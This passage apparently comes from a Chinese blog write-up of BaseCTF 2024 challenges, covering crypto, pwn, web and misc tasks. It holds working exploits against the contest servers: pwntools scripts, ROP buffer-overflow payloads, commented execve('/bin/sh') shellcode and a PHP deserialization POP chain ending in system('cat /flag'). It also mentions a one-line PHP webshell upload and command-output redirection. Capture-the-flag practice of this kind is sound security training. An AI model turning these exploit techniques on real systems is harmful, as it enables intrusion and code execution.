class="hljs-keyword">except</span> UnicodeDecodeError:<br>        <span class="hljs-keyword">return</span> decrypted.<span class="hljs-built_in">hex</span>(), <span class="hljs-string">&quot;无法解码为ASCII，十六进制结果&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    encrypted_flag = (<br>        <span class="hljs-string">b&#x27;\x01\x09\x05\x25\x26\x2D\x0B\x1D&#x27;</span><br>        <span class="hljs-string">b&#x27;\x24\x7A\x31\x20\x1E\x49\x3D\x67&#x27;</span><br>        <span class="hljs-string">b&#x27;\x4D\x50\x08\x25\x2E\x6E\x05\x34&#x27;</span><br>        <span class="hljs-string">b&#x27;\x22\x40\x3B\x25&#x27;</span><br>    )<br><br>    key_value = <span class="hljs-number">7499608</span><br><br>    <span class="hljs-comment"># 定义不同格式的key</span><br>    keys = [<br>        struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, key_value),      <span class="hljs-comment"># 小端 32 位</span><br>        struct.pack(<span class="hljs-string">&#x27;&gt;I&#x27;</span>, key_value),      <span class="hljs-comment"># 大端 32 位</span><br>        struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, key_value)[:<span class="hljs-number">3</span>],  <span class="hljs-comment"># 小端 24 位</span><br>        struct.pack(<span class="hljs-string">&#x27;&gt;I&#x27;</span>, key_value)[<span class="hljs-number">1</span>:],  <span class="hljs-comment"># 大端 24 位</span><br>    ]<br><br>    <span class="hljs-keyword">for</span> i, key <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(keys):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n尝试 key <span class="hljs-subst">&#123;i + <span class="hljs-number">1</span>&#125;</span>: <span class="hljs-subst">&#123;key.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>        result, status = attempt_decryption(encrypted_flag, key)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;status&#125;</span>: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="签个到吧"><a href="#签个到吧" class="headerlink" title="签个到吧"></a>签个到吧</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># 设置连接信息</span><br>host = <span class="hljs-string">&#x27;challenge.basectf.fun&#x27;</span><br>port = <span class="hljs-number">33292</span><br><span class="hljs-comment"># 连接到远程服务</span><br>p = remote(host, port)<br><br><span class="hljs-comment"># 发送和接收数据</span><br>p.sendline(<span class="hljs-string">b&#x27;cat /flag&#x27;</span>)<br>response = p.recvline()<br><span class="hljs-built_in">print</span>(response.decode())<br><br><span class="hljs-comment"># 继续其他的交互操作</span><br><span class="hljs-comment"># 关闭连接</span><br>p.close()<br></code></pre></td></tr></table></figure><h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置连接信息</span><br>host = <span class="hljs-string">&#x27;challenge.basectf.fun&#x27;</span><br>port = <span class="hljs-number">40511</span><br><br><span class="hljs-comment"># 连接到远程服务</span><br>p = remote(host, port)<br><br><span class="hljs-comment"># 尝试使用 echo 和 bash 的 &lt; 操作符读取文件</span><br>p.sendline(<span class="hljs-string">b&#x27;echo $(&lt;/flag)&#x27;</span>)<br>response = p.recvline()<br><span class="hljs-built_in">print</span>(response.decode())<br><br><span class="hljs-comment"># 关闭连接</span><br>p.close()<br></code></pre></td></tr></table></figure><h3 id="我把她丢了"><a href="#我把她丢了" class="headerlink" title="我把她丢了"></a>我把她丢了</h3><p>填充使其溢出调用到bin&#x2F;sh,就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;challenge.basectf.fun&quot;</span>, <span class="hljs-number">49516</span>)<br><br><span class="hljs-comment">#system_plt=elf.plt[&quot;system&quot;]</span><br>pop_rdi_ret=<span class="hljs-number">0x0000000000401196</span><br>main=<span class="hljs-number">0x000000000040124B</span><br>payload=<span class="hljs-number">0x78</span>*<span class="hljs-string">b&#x27;a&#x27;</span>+p64(pop_rdi_ret)+p64(<span class="hljs-number">0x0000000000402008</span>)+p64(<span class="hljs-number">0x000000000040120F</span>)+p64(main)<br><span class="hljs-comment">#寄存器地址-&gt;bin/sh调用到system最后进入main</span><br>p.sendline(payload)<br><br><span class="hljs-comment"># 进入交互模式</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="Re2text"><a href="#Re2text" class="headerlink" title="Re2text"></a>Re2text</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 连接到远程服务</span><br>p = remote(<span class="hljs-string">&quot;challenge.basectf.fun&quot;</span>, <span class="hljs-number">30147</span>)<br><br><span class="hljs-comment"># 构造 payload</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x28</span>+p64(<span class="hljs-number">0x40101A</span>)+p64(<span class="hljs-number">0x4011a4</span>)           <span class="hljs-comment"># 填充缓冲区</span><br><br><span class="hljs-comment"># 发送 payload</span><br>p.sendline(payload)<br><br><span class="hljs-comment"># 进入交互模式</span><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="shellcode-level0"><a href="#shellcode-level0" class="headerlink" title="shellcode_level0"></a>shellcode_level0</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 连接到远程服务</span><br>p = remote(<span class="hljs-string">&#x27;challenge.basectf.fun&#x27;</span>, <span class="hljs-number">49846</span>)<br><br><span class="hljs-comment"># Shellcode 是一段二进制代码，可以直接在内存中执行。这个 shellcode 会启动一个 /bin/sh shell。</span><br><br>shellcode = (<br>    <span class="hljs-string">b&quot;\x48\x31\xc0&quot;</span>            <span class="hljs-comment"># xor rax, rax        ; 清空 rax 寄存器 (rax = 0)</span><br>    <span class="hljs-string">b&quot;\x50&quot;</span>                    <span class="hljs-comment"># push rax            ; 将 rax (0) 压入栈，作为 NULL 终止符</span><br>    <span class="hljs-string">b&quot;\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68&quot;</span> <span class="hljs-comment"># mov rbx, 0x68732f2f6e69622f ; 将 &quot;/bin//sh&quot; 存入 rbx</span><br>    <span class="hljs-string">b&quot;\x53&quot;</span>                    <span class="hljs-comment"># push rbx            ; 将 rbx (&quot;/bin//sh&quot;) 压入栈</span><br>    <span class="hljs-string">b&quot;\x48\x89\xe7&quot;</span>            <span class="hljs-comment"># mov rdi, rsp        ; 将栈指针 rsp 的值赋给 rdi，现在 rdi 指向 &quot;/bin//sh&quot;</span><br>    <span class="hljs-string">b&quot;\x48\x31\xf6&quot;</span>            <span class="hljs-comment"># xor rsi, rsi        ; 清空 rsi 寄存器 (rsi = 0)，表示 NULL</span><br>    <span class="hljs-string">b&quot;\x48\x31\xd2&quot;</span>            <span class="hljs-comment"># xor rdx, rdx        ; 清空 rdx 寄存器 (rdx = 0)，表示 NULL</span><br>    <span class="hljs-string">b&quot;\x48\x31\xc0&quot;</span>            <span class="hljs-comment"># xor rax, rax        ; 清空 rax 寄存器 (rax = 0)</span><br>    <span class="hljs-string">b&quot;\xb0\x3b&quot;</span>                <span class="hljs-comment"># mov al, 0x3b        ; 将 0x3b (59) 赋给 al 寄存器，59 是 execve 的系统调用号</span><br>    <span class="hljs-string">b&quot;\x0f\x05&quot;</span>                <span class="hljs-comment"># syscall             ; 触发系统调用，执行 execve(&quot;/bin/sh&quot;, NULL, NULL)</span><br>)<br><br>p.sendline(shellcode)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="HTTP-是什么呀"><a href="#HTTP-是什么呀" class="headerlink" title="HTTP 是什么呀"></a>HTTP 是什么呀</h3><p>?basectf&#x3D;we1c%2500me</p><p>Base&#x3D;fl@g</p><p><img src="/../../images/basectf/basectf2024/http1.png" alt="http1"></p><p><img src="/../../images/basectf/basectf2024/http2.png" alt="http2"></p><p><img src="/../../images/basectf/basectf2024/http3.png" alt="http3"></p><p>base解密得到flag</p><h3 id="喵喵喵´•ﻌ•"><a href="#喵喵喵´•ﻌ•" class="headerlink" title="喵喵喵´•ﻌ•&#96;"></a>喵喵喵´•ﻌ•&#96;</h3><p><img src="/../../images/basectf/basectf2024/%E5%96%B5%E5%96%B5%E5%96%B5.png" alt="喵喵喵"></p><h3 id="md5绕过欸"><a href="#md5绕过欸" class="headerlink" title="md5绕过欸"></a>md5绕过欸</h3><p><img src="/../../images/basectf/basectf2024/md5.png" alt="md5"></p><h3 id="A-Dark-Room"><a href="#A-Dark-Room" class="headerlink" title="A Dark Room"></a>A Dark Room</h3><p>直接查看源码得到flag</p><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>上传一句话木马，观看源码在uploads&#x2F;，直接上传php即可</p><h3 id="Aura-酱的礼物"><a href="#Aura-酱的礼物" class="headerlink" title="Aura 酱的礼物"></a>Aura 酱的礼物</h3><p>混了个二血😋</p><p>前两个一个是php伪协议，一个直接输入</p><p>第三个</p><p>我是用的是@进行重定向，然后用我自己的vps开个端口进行拼接就行（理论上不需要这么复杂，只是最先想到这个办法</p><p><img src="/../../images/basectf/basectf2024/aura.png" alt="aura"></p><p>最后进行伪协议读取flag</p><p> &#x2F;&#x2F; flag{c985afc7-50f1-44e5-87f0-221d081b9459}  Aura 酱有拿到一血吗？</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="你也喜欢圣物吗"><a href="#你也喜欢圣物吗" class="headerlink" title="你也喜欢圣物吗"></a>你也喜欢圣物吗</h3><p>打开下来先用010打开图片看，底部有个base64的编码</p><p>提示去看LSB</p><p>利用stegsolve进行分析，得到key</p><p>解开第一层压缩包</p><p>第二层伪加密工具进行解密，打开进去滑到下面有个真的flag</p><h3 id="根本进不去啊"><a href="#根本进不去啊" class="headerlink" title="根本进不去啊!"></a>根本进不去啊!</h3><p><img src="/../../images/basectf/basectf2024/%E8%BF%9B%E4%B8%8D%E5%8E%BB.png" alt="进不去"></p><p>dig的命令是进行域信息搜索器，找txt得到flag</p><h3 id="海上遇到了鲨鱼"><a href="#海上遇到了鲨鱼" class="headerlink" title="海上遇到了鲨鱼"></a>海上遇到了鲨鱼</h3><p>利用wireshark打开，http找到php,里面有flag,进行简单的反转得到flag</p><h3 id="正着看还是反着看呢？"><a href="#正着看还是反着看呢？" class="headerlink" title="正着看还是反着看呢？"></a>正着看还是反着看呢？</h3><p>利用python读取图片文件，然后反转图片进行逆向</p><p>将文件拖到虚拟机，进行foremost，里面有压缩包解压得到flag</p><h3 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h3><p>直接64，32进行解密</p><h3 id="签到！DK-盾！"><a href="#签到！DK-盾！" class="headerlink" title="签到！DK 盾！"></a>签到！DK 盾！</h3><p>直接公众号发送就行</p><h3 id="人生苦短，我用Python"><a href="#人生苦短，我用Python" class="headerlink" title="人生苦短，我用Python"></a>人生苦短，我用Python</h3><p>其他部分都可以看着推，我这边放一下<strong>推算15</strong>的情况</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><br><span class="hljs-comment"># 目标值</span><br>target_value = <span class="hljs-number">41378751114180610</span><br><br><span class="hljs-comment"># 我们已知的 flag 结构</span><br>flag = <span class="hljs-string">&#x27;BaseCTF&#123;s1Mpl3_1s_l1Tt3r_Th4n_C0mPl3x&#125;&#x27;</span><br><br><span class="hljs-comment"># 定义我们将尝试的字符集</span><br>charset = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#x27;</span><br><br><span class="hljs-comment"># 计算函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_sum</span>(<span class="hljs-params">chars</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">ord</span>(c) * <span class="hljs-number">2024_08_15</span> ** idx <span class="hljs-keyword">for</span> idx, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(chars))<br><br><span class="hljs-comment"># 生成所有可能的组合并测试</span><br><span class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> itertools.product(charset, repeat=<span class="hljs-number">3</span>):<br>    candidate = <span class="hljs-string">&#x27;&#x27;</span>.join(combo)<br>    <span class="hljs-keyword">if</span> calculate_sum(candidate) == target_value:<br>        <span class="hljs-comment"># 找到符合条件的组合，更新 flag</span><br>        flag = flag[:<span class="hljs-number">17</span>] + candidate + flag[<span class="hljs-number">20</span>:]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found correct sequence: <span class="hljs-subst">&#123;candidate&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Correct flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No valid sequence found.&quot;</span>)<br><span class="hljs-comment">#得到flagimport itertools</span><br><br><span class="hljs-comment"># 目标值</span><br>target_value = <span class="hljs-number">41378751114180610</span><br><br><span class="hljs-comment"># 我们已知的 flag 结构</span><br>flag = <span class="hljs-string">&#x27;BaseCTF&#123;s1Mpl3_1s_l1Tt3r_Th4n_C0mPl3x&#125;&#x27;</span><br><br><span class="hljs-comment"># 定义我们将尝试的字符集</span><br>charset = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#x27;</span><br><br><span class="hljs-comment"># 计算函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_sum</span>(<span class="hljs-params">chars</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">ord</span>(c) * <span class="hljs-number">2024_08_15</span> ** idx <span class="hljs-keyword">for</span> idx, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(chars))<br><br><span class="hljs-comment"># 生成所有可能的组合并测试</span><br><span class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> itertools.product(charset, repeat=<span class="hljs-number">3</span>):<br>    candidate = <span class="hljs-string">&#x27;&#x27;</span>.join(combo)<br>    <span class="hljs-keyword">if</span> calculate_sum(candidate) == target_value:<br>        <span class="hljs-comment"># 找到符合条件的组合，更新 flag</span><br>        flag = flag[:<span class="hljs-number">17</span>] + candidate + flag[<span class="hljs-number">20</span>:]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found correct sequence: <span class="hljs-subst">&#123;candidate&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Correct flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No valid sequence found.&quot;</span>)<br><span class="hljs-comment">#BaseCTF&#123;s1Mpl3_1s_BeTt3r_Th4n_C0mPl3x&#125;</span><br></code></pre></td></tr></table></figure><h3 id="倒计时？海报！"><a href="#倒计时？海报！" class="headerlink" title="倒计时？海报！"></a>倒计时？海报！</h3><p>配合stegsolve即可正确食用，一开始一直没写听说废眼，真正做的话十分钟以内估计就解决了附上各个对应的截图</p><img src="/../../images/basectf/basectf2024/haibao1.png" alt="haibao1" style="zoom: 50%;"><img src="/../../images/basectf/basectf2024/haibao2.png" alt="haibao1" style="zoom: 50%;"><img src="/../../images/basectf/basectf2024/haibao3.png" alt="haibao1" style="zoom: 50%;"><img src="/../../images/basectf/basectf2024/haibao4.png" alt="haibao1" style="zoom: 50%;"><img src="/../../images/basectf/basectf2024/haibao5.png" alt="haibao1" style="zoom: 50%;"><img src="/../../images/basectf/basectf2024/haibao6.png" alt="haibao1" style="zoom: 50%;"><img src="/../../images/basectf/basectf2024/haibao7.png" alt="haibao1" style="zoom: 50%;"><img src="/../../images/basectf/basectf2024/haibao8.png" alt="haibao1" style="zoom: 50%;"><img src="/../../images/basectf/basectf2024/haibao9.png" alt="haibao1" style="zoom: 50%;"><img src="/../../images/basectf/basectf2024/haibao10.png" alt="haibao1" style="zoom: 50%;"><p><strong>BaseCTF{c0unt_d0wn_fro3_X_every_d@y_i5_re@11y_c0o1_@nd_h@rd_t0_do_1t_ev3ry_n1ght}</strong></p><h3 id="喵喵太可爱了"><a href="#喵喵太可爱了" class="headerlink" title="喵喵太可爱了"></a>喵喵太可爱了</h3><p>跟着幸运儿拿的flag</p><p><strong>BaseCTF{m1a0_mi@o_1s_n0t_a_b3tr4yer_t0_t3l1_the_f1ag}</strong></p><h1 id="week2-以后只写web了，orz"><a href="#week2-以后只写web了，orz" class="headerlink" title="week2(以后只写web了，orz)"></a>week2(以后只写web了，orz)</h1><h2 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h2><h3 id="ez-ser"><a href="#ez-ser" class="headerlink" title="ez_ser"></a>ez_ser</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">re</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$chu0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;chu0))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I can not believes!&quot;</span>;<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;chu0-&gt;<span class="hljs-variable">$nononono</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">web</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$kw</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dt</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;lalalla&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;kw;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ALL Done!&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pwn</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dusk</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$over</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;dusk != <span class="hljs-string">&quot;gods&quot;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;什么，你竟敢不认可?&quot;</span>;<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;over-&gt;<span class="hljs-title function_ invoke__">getflag</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Misc</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nothing</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;happy happy happy!&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are over!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$ser</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ser&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>构造exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$exp</span> = <span class="hljs-keyword">new</span> web;<br><span class="hljs-variable">$exp</span>-&gt;kw = <span class="hljs-keyword">new</span> re;<br><span class="hljs-variable">$exp</span>-&gt;kw-&gt;chu0 = <span class="hljs-keyword">new</span> pwn;<br><span class="hljs-variable">$exp</span>-&gt;kw-&gt;chu0-&gt;over = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Misc</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>));<br></code></pre></td></tr></table></figure><h3 id="一起吃豆豆"><a href="#一起吃豆豆" class="headerlink" title="一起吃豆豆"></a>一起吃豆豆</h3><p>不能直接f12，可以用浏览器的开发者工具打开f12，看js代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">context.<span class="hljs-title function_">fillText</span>(_LIFE ? <span class="hljs-title function_">atob</span>(<span class="hljs-string">&quot;QmFzZUNURntKNV9nYW0zXzFzX2Vhc3lfdDBfaDRjayEhfQ==&quot;</span>) : <span class="hljs-string">&#x27;GAME OVER&#x27;</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span>);<br></code></pre></td></tr></table></figure><p>base64解一下就出来了</p><h3 id="Happy-Birthday"><a href="#Happy-Birthday" class="headerlink" title="Happy Birthday"></a>Happy Birthday</h3><p>尝试了一下发现要传pdf格式并且需要文件相同，可以参考我php绕过那篇文章，利用fastcoll.exe生成两个文件，得到flag</p><h3 id="你听不到我的声音"><a href="#你听不到我的声音" class="headerlink" title="你听不到我的声音"></a>你听不到我的声音</h3><p>这题考察的是这个函数没有直接的回显，可以重定向，利用&gt;得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=<span class="hljs-built_in">cat</span> /flag&gt;1.txt<br></code></pre></td></tr></table></figure><h3 id="Really-EZ-POP"><a href="#Really-EZ-POP" class="headerlink" title="Really EZ POP"></a>Really EZ POP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 